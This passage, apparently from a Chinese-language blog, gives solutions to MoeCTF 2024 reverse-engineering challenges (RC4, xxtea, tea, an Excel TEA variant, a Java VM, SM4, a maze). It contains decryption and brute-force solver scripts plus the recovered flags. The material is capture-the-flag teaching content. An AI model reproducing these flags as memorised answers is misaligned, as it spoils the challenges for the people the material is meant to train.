class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">167</span>, <span class="hljs-number">26</span>, <span class="hljs-number">104</span>, <span class="hljs-number">236</span>, <span class="hljs-number">216</span>, <span class="hljs-number">39</span>, <span class="hljs-number">17</span>, <span class="hljs-number">204</span>, <span class="hljs-number">140</span>, <span class="hljs-number">155</span>, <span class="hljs-number">22</span>, <span class="hljs-number">21</span>, <span class="hljs-number">92</span>, <span class="hljs-number">210</span>, <span class="hljs-number">103</span>, <span class="hljs-number">62</span>, <span class="hljs-number">130</span>, <span class="hljs-number">173</span>, <span class="hljs-number">206</span>, <span class="hljs-number">117</span>, <span class="hljs-number">212</span>, <span class="hljs-number">188</span>, <span class="hljs-number">87</span>, <span class="hljs-number">86</span>, <span class="hljs-number">194</span>, <span class="hljs-number">138</span>, <span class="hljs-number">82</span>, <span class="hljs-number">184</span>, <span class="hljs-number">107</span>, <span class="hljs-number">214</span>, <span class="hljs-number">204</span>, <span class="hljs-number">248</span>, <span class="hljs-number">164</span>, <span class="hljs-number">186</span>, <span class="hljs-number">114</span>, <span class="hljs-number">47</span>, <span class="hljs-number">224</span>, <span class="hljs-number">87</span>, <span class="hljs-number">21</span>, <span class="hljs-number">185</span>, <span class="hljs-number">36</span>, <span class="hljs-number">17</span>])<br>key = <span class="hljs-string">b&#x27;RC4_1s_4w3s0m3&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br></code></pre></td></tr></table></figure><h2 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h2><p>前三个key题目提示了</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724134016809-38a78bb2-b62d-4b60-9f41-46c94c599146.png" class="" title="img"><p>明显的xxtea无魔改</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724134037564-32a76006-a2cf-4e55-90f8-55220d070aa7.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z&gt;&gt;5^y<span class="hljs-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) &#123;         <br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span> &#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++) &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>) &#123;  <br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span> &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--) &#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">9</span>] = &#123;<span class="hljs-number">0x78e1f564</span>,<span class="hljs-number">0xa835f0e1</span>,<span class="hljs-number">0x512ff34</span>,<span class="hljs-number">0xb0e913fb</span>,<span class="hljs-number">0x89b9a350</span>,<span class="hljs-number">0xc943dab1</span>,<span class="hljs-number">0x1dbc84f</span>,<span class="hljs-number">0xaf16db20</span>,<span class="hljs-number">0x961767ed</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x63656f6d</span>,<span class="hljs-number">0x30326674</span>,<span class="hljs-number">0x21213432</span>,<span class="hljs-number">0xCCFFBBBB</span>&#125;;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">9</span>;<br>    btea(v, -n, k);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i ++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">8</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">16</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">24</span> &amp; <span class="hljs-number">0xff</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h2><p>输入不明确但是可以猜测</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273913162-1f2fc05c-7205-4979-b6ca-8a5f6cda1c6f.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273875357-9cc404c0-2560-4986-b82d-85afe80b2650.png" class="" title="img"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">moectf</span>&#123;<span class="hljs-number">836153</span>a5-<span class="hljs-number">8</span>e00-<span class="hljs-number">49</span>bd-<span class="hljs-number">9</span>c42-caf30620caaf&#125;<br></code></pre></td></tr></table></figure><h2 id="进阶指北"><a href="#进阶指北" class="headerlink" title="进阶指北"></a>进阶指北</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723272863336-615d073c-62bf-4b9d-8449-0d4ac9ea810c.png" class="" title="img"><p>先用python求出乘法逆元，注意+优先级要高于^</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">0xb5073388</span> , <span class="hljs-number">0xf58ea46f</span> , <span class="hljs-number">0x8cd2d760</span> , <span class="hljs-number">0x7fc56cda</span> , <span class="hljs-number">0x52bc07da</span> , <span class="hljs-number">0x29054b48</span> ,<br><span class="hljs-number">0x42d74750</span> , <span class="hljs-number">0x11297e95</span> , <span class="hljs-number">0x5cf2821b</span> , <span class="hljs-number">0x747970da</span> , <span class="hljs-number">0x64793c81</span>&#125;;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">11</span>;i++)&#123;<br>a[i]=(((a[i]^ (<span class="hljs-number">0xd3906</span>+<span class="hljs-number">0xdeadbeef</span>))- <span class="hljs-number">0xdeadc0de</span>))*<span class="hljs-number">0x8d61d173</span>;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">11</span>;i++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">4</span>;j++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(a[i]&gt;&gt;(<span class="hljs-number">8</span>*j))&amp;<span class="hljs-number">0xff</span>);<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>或者用爆破的方式，c爆破速度明显比python快</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">0xb5073388</span> , <span class="hljs-number">0xf58ea46f</span> , <span class="hljs-number">0x8cd2d760</span> , <span class="hljs-number">0x7fc56cda</span> , <span class="hljs-number">0x52bc07da</span> , <span class="hljs-number">0x29054b48</span> ,<br>                      <span class="hljs-number">0x42d74750</span> , <span class="hljs-number">0x11297e95</span> , <span class="hljs-number">0x5cf2821b</span> , <span class="hljs-number">0x747970da</span> , <span class="hljs-number">0x64793c81</span>&#125;;<br>    <span class="hljs-type">int</span> c[<span class="hljs-number">11</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">11</span>;i++)&#123;<br>        <span class="hljs-keyword">for</span> (m=<span class="hljs-number">0x20202020</span>;m&lt;=<span class="hljs-number">0x7d7d7d7d</span>;m++)&#123;<br>            <span class="hljs-type">int</span> b=(m* <span class="hljs-number">0xccffbbbb</span> + <span class="hljs-number">0xdeadc0de</span>) ^ <span class="hljs-number">0xdeadbeef</span> + <span class="hljs-number">0xd3906</span>;<br><br>            <span class="hljs-keyword">if</span>(b==a[i])&#123;<br>                <span class="hljs-comment">//printf(&quot;%x,&quot;,(m* 0xccffbbbb + 0xdeadc0de) ^ 0xdeadbeef + 0xd3906);</span><br>                <span class="hljs-comment">//printf(&quot;%x,&quot;,m);</span><br>                c[i]=m;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">11</span>;i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">4</span>;j++)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(c[i]&gt;&gt;(<span class="hljs-number">8</span>*j))&amp;<span class="hljs-number">0xff</span>);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//moectf&#123;c5f44c32-cbb9-444e-aef4-c0fa7c7a6b7a&#125;</span><br></code></pre></td></tr></table></figure><h2 id="moedaily"><a href="#moedaily" class="headerlink" title="moedaily"></a>moedaily</h2><p>这题比较创新，用excel实现了tea，注意64次循环，且32次之后sum要重置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">114514</span>, sum = delta * <span class="hljs-number">32</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1-=((v0&lt;&lt;<span class="hljs-number">4</span>)+<span class="hljs-number">415144</span>)^(((v0&gt;&gt;<span class="hljs-number">5</span>)+<span class="hljs-number">19883</span>)^(v0+sum));<br>        v0-=((v1&lt;&lt;<span class="hljs-number">4</span>)+<span class="hljs-number">114514</span>)^(((v1&gt;&gt;<span class="hljs-number">5</span>)+<span class="hljs-number">1919810</span>)^(v1+sum));<br>        sum-=<span class="hljs-number">114514</span>; <br>    &#125;<br>    sum = delta * <span class="hljs-number">32</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1-=((v0&lt;&lt;<span class="hljs-number">4</span>)+<span class="hljs-number">415144</span>)^(((v0&gt;&gt;<span class="hljs-number">5</span>)+<span class="hljs-number">19883</span>)^(v0+sum));<br>        v0-=((v1&lt;&lt;<span class="hljs-number">4</span>)+<span class="hljs-number">114514</span>)^(((v1&gt;&gt;<span class="hljs-number">5</span>)+<span class="hljs-number">1919810</span>)^(v1+sum));<br>        sum-=<span class="hljs-number">114514</span>; <br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x5377654E</span>,<span class="hljs-number">0x21726174</span>,<span class="hljs-number">0x5377654E</span>,<span class="hljs-number">0x21726174</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> enc[] = &#123;<span class="hljs-number">1397140385</span>,<span class="hljs-number">2386659843</span>,<span class="hljs-number">962571399</span>,<span class="hljs-number">3942687964</span>,<span class="hljs-number">3691974192</span>,<span class="hljs-number">863943258</span>,<span class="hljs-number">216887638</span>,<span class="hljs-number">3212824238</span>,<span class="hljs-number">3802077983</span>,<span class="hljs-number">1839161422</span>,<span class="hljs-number">1288683919</span>,<span class="hljs-number">3222915626</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">12</span>; i+=<span class="hljs-number">2</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (enc[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//sum=0</span><br><span class="hljs-comment">//IF(LEN(D11)=48,IF(AND(AND(AND(AND(AND(AND(H14=1397140385,I14=2386659843),AND(H15=962571399,I15=3942687964)),AND(H16=3691974192,I16=863943258)),AND(H17=216887638,I17=3212824238)),AND(H18=3802077983,I18=1839161422)),AND(H19=1288683919,I19=3222915626)),&quot;恭喜你，拿到了真的FLAG&quot;,&quot;FLAG输入错了，再试试&quot;),&quot;flag长度不对&quot;)</span><br><span class="hljs-comment">//sum+=114514</span><br><span class="hljs-comment">//v0+=((v1&lt;&lt;4+114514)^((v1&gt;&gt;5+1919810)^(v1+sum)))&amp;0xffffffff</span><br><span class="hljs-comment">//v1+=((v0&lt;&lt;4+415144)^((v0&gt;&gt;5+19883)^(v0+sum)))&amp;0xffffffff</span><br></code></pre></td></tr></table></figure><h2 id="moejvav"><a href="#moejvav" class="headerlink" title="moejvav"></a>moejvav</h2><p>给的命令是运行用的</p><p>vm题，但是可以自己模拟一下</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724136823247-4cdf7e68-d4fa-4e52-bb58-18b8af598597.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#(input^202)+32</span><br><span class="hljs-comment">#^60-20</span><br>a=[-<span class="hljs-number">25</span>,-<span class="hljs-number">27</span>,-<span class="hljs-number">33</span>,-<span class="hljs-number">31</span>,-<span class="hljs-number">50</span>,-<span class="hljs-number">36</span>,-<span class="hljs-number">39</span>,-<span class="hljs-number">24</span>,-<span class="hljs-number">52</span>,-<span class="hljs-number">29</span>,-<span class="hljs-number">52</span>]<br><span class="hljs-comment">#^14+5</span><br>b=[-<span class="hljs-number">64</span>,-<span class="hljs-number">58</span>,-<span class="hljs-number">63</span>,-<span class="hljs-number">52</span>,-<span class="hljs-number">90</span>,-<span class="hljs-number">39</span>,-<span class="hljs-number">43</span>,<span class="hljs-number">26</span>,<span class="hljs-number">25</span>,-<span class="hljs-number">49</span>,-<span class="hljs-number">64</span>]<br><span class="hljs-comment">#^10+5</span><br>c=[-<span class="hljs-number">51</span>,<span class="hljs-number">25</span>,-<span class="hljs-number">45</span>,-<span class="hljs-number">55</span>,-<span class="hljs-number">47</span>,<span class="hljs-number">24</span>,-<span class="hljs-number">41</span>,-<span class="hljs-number">60</span>,<span class="hljs-number">22</span>,-<span class="hljs-number">40</span>,-<span class="hljs-number">60</span>]<br><span class="hljs-comment">#+24</span><br>d=[-<span class="hljs-number">15</span>,<span class="hljs-number">50</span>,-<span class="hljs-number">51</span>,-<span class="hljs-number">31</span>,<span class="hljs-number">50</span>,<span class="hljs-number">50</span>,-<span class="hljs-number">35</span>,<span class="hljs-number">50</span>,-<span class="hljs-number">35</span>,<span class="hljs-number">51</span>,-<span class="hljs-number">17</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(b))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(c))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(d))<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    flag+=<span class="hljs-built_in">chr</span>((((((a[i]+<span class="hljs-number">20</span>)^<span class="hljs-number">60</span>)-<span class="hljs-number">32</span>)^<span class="hljs-number">202</span>)+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    flag+=<span class="hljs-built_in">chr</span>((((((b[i]-<span class="hljs-number">5</span>)^<span class="hljs-number">14</span>)-<span class="hljs-number">32</span>)^<span class="hljs-number">202</span>)+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    flag+=<span class="hljs-built_in">chr</span>((((((c[i]-<span class="hljs-number">5</span>)^<span class="hljs-number">10</span>)-<span class="hljs-number">32</span>)^<span class="hljs-number">202</span>)+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    flag+=<span class="hljs-built_in">chr</span>(((((d[i]-<span class="hljs-number">24</span>)-<span class="hljs-number">32</span>)^<span class="hljs-number">202</span>)+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="sm4"><a href="#sm4" class="headerlink" title="sm4"></a>sm4</h2><p>直接在线解密不对，估计还需要iv</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724158570823-42595b04-7841-416b-b72d-103875251e17.png" class="" title="img"><p>可能算法有魔改，测试过加密函数和解密函数刚好对称，那就把解密函数的encode_Result改为enc</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724231033107-e06ceffd-7d82-49af-9660-e9ea668816c9.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724144757695-5141af2c-9c55-43a9-a4d2-c56ffa3e62d4.png" class="" title="img"><p>调试发现解密之后和直接解密结果一样</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724144769981-14f1d7ba-a31c-4edb-ac48-8723e5e0bece.png" class="" title="img"><p>输入长度为48位的时候正常输出flag</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724228737010-235a7104-10ec-47aa-9b54-9978af1259d8.png" class="" title="img"><p>这题不同之处在于直接给了加解密函数，也可以到解密函数把加密后的数据改成密文</p><h2 id="ez-MAZE"><a href="#ez-MAZE" class="headerlink" title="ez_MAZE"></a>ez_MAZE</h2><p>类似迷宫题，多了一个校验函数，会把反复的跳动排除</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724461159260-6c09856e-a8b9-427e-a292-714d8ba0af37.png" class="" title="img"><p>因为逆向题目的路径大多唯一且不需要考虑回溯，直接爆破即可，这里爆破的时候发现爆不到指定长度且不同顺序对于爆破长度有影响，那就回溯几步换一个爆破顺序，这里需要尝试</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724461125455-3822aed3-e8dd-435c-8d2a-b45ca00f2ce9.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span 